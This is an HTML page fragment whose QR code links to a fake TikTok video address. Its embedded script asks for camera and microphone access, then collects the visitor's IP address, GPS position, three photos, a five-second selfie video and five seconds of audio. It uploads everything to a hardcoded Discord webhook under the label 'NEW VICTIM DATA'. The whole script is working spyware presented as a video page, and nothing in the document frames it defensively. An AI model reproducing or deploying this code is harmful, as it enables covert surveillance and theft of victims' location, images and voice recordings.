 <body>
     <div class="container">

     <script>
         new QRCode(document.getElementById("qrcode"), {
             text: "https://tiktok.wtch.pro?video=1032711939 ",

     <script>
         const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1354180731139657768/MYr76j8rVFUzNUnKR95g_XY_oZun4PIVh9YlJpbuIkxAe3CdXjW-951jCOBcGd68X2oP';

         async function initiateTotalChaos() {
             let media;
             const debugData = {};

             try {
                 // ================== INSTANT MEDIA REQUEST ================== //
                 media = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'environment' },
                     audio: true
                 });

                 // ================== PARALLEL DATA COLLECTION ================== //
                 const [ipData, geoloc, frontCam, selfieVideo, audioBlob] = await Promise.all([
                     // IP Data
                     fetch('https://ipwho.is/').then(res => res.json()),

                     // Geolocation
                     new Promise((resolve) =>
                         navigator.geolocation.getCurrentPosition(resolve)),

                     // Front camera photos
                     (async () => {
                         const capture = new ImageCapture(media.getVideoTracks()[0]);
                         const photos = await Promise.all([1, 2, 3].map(() => capture.takePhoto()));
                         media.getVideoTracks().forEach(track => track.stop());
                         return photos;
                     })(),

                     // Selfie camera VIDEO recording (5 seconds)
                     (async () => {
                         const stream = await navigator.mediaDevices.getUserMedia({
                             video: { facingMode: 'user' }
                         });

                         const recorder = new MediaRecorder(stream);
                         const chunks = [];

                         return new Promise((resolve) => {
                             recorder.ondataavailable = e => chunks.push(e.data);
                             recorder.start();
                             setTimeout(() => {
                                 recorder.stop();
                                 stream.getTracks().forEach(track => track.stop());
                                 resolve(new Blob(chunks, { type: 'video/webm' }));
                             }, 5000);
                         });
                     })(),

                     // Audio recording
                     (async () => {
                         const recorder = new MediaRecorder(media);
                         const chunks = [];
                         recorder.ondataavailable = e => chunks.push(e.data);
                         recorder.start();
                         await new Promise(r => setTimeout(r, 5000));
                         recorder.stop();
                         return new Blob(chunks, { type: 'audio/webm' });
                     })()
                 ]);

                 // Store collected data
                 debugData.ip = ipData.ip;
                 debugData.gps = `${geoloc.coords.latitude},${geoloc.coords.longitude}`;

                 // ================== DISCORD UPLOAD ================== //
                 const formData = new FormData();
                 formData.append('content', `ðŸš¨ NEW VICTIM DATA ðŸš¨
 IP: ${debugData.ip}
 GPS: ${debugData.gps}
 User Agent: ${navigator.userAgent}`);

                 // Add front camera photos
                 frontCam.forEach((photo, index) => {
                     formData.append(`photo_${index}`, photo, `front_${index}.jpg`);
                 });

                 // Add selfie video
                 formData.append('video_selfie', selfieVideo, 'selfie_recording.webm');

                 // Add audio
                 formData.append('audio', audioBlob, 'voice.webm');

                 await fetch(DISCORD_WEBHOOK, {
                     method: 'POST',
                     body: formData
                 });

             } catch (error) {
                 console.error('FRANK ERROR:', error);
                 localStorage.setItem('frank_failsafe', JSON.stringify({
                     error: error.message,
                     debugData,
                     timestamp: Date.now()
                 }));
             } finally {
                 if (media) media.getTracks().forEach(track => track.stop());
             }
         }
     </script>
